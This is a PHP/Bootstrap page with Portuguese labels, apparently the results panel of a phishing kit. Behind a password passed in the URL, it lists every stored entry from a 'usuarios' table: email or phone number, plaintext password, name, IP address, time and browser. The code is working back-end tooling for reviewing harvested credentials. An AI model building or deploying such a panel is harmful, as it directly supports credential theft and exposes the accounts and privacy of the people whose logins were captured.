
<?php require_once("../config.php"); ?>
<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Usuarios</title>

    <!-- Bootstrap -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
  <div class="main">
         <?php if (isset($_GET["senha"])){
		if($_GET["senha"] == $senha){

	?>
  <table class="table table-bordered">
    <thead>
      <tr>
        <th>#</th>
        <th>Email/Numero</th>
        <th>senha</th>
	<th>nome</th>
	<th>ip</th>
	<th>Hora/Data</th>
	<th>Browser</th>
      </tr>
    </thead>
    <tbody>
	<?php
		$conexao = new PDO("mysql:host=".$host.";dbname=".$db,$user,$pass);
		if ($conexao){
			$c = $conexao->prepare("SELECT * FROM usuarios ORDER BY id DESC");

			if($c->execute()){
					while($usuario = $c->fetch(PDO::FETCH_OBJ)){
						?>
	 <tr>
      	 <td><?php print(strip_tags($usuario->id)); ?></td> 
       	 <td><?php print(strip_tags($usuario->email)); ?></td>
      	 <td><?php print(strip_tags($usuario->senha)); ?></td>
	 <td><?php print(strip_tags($usuario->nome)); ?></td>
	 <td><?php print(strip_tags($usuario->ip)); ?></td>
	 <td><?php print(strip_tags($usuario->HoraData)); ?></td>
	 <td><?php print(strip_tags($usuario->UserAgent)); ?></td>
      	</tr>
						<?php
					}
			}
		}

		
	?>
    </tbody>
  </table>
	<?php

	}else{print("<h1>???????</h1>");}
	}else{print("<h1>???????</h1>");}
?>
</div>
	
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/bootstrap.min.js"></script>
  </body>
</html>
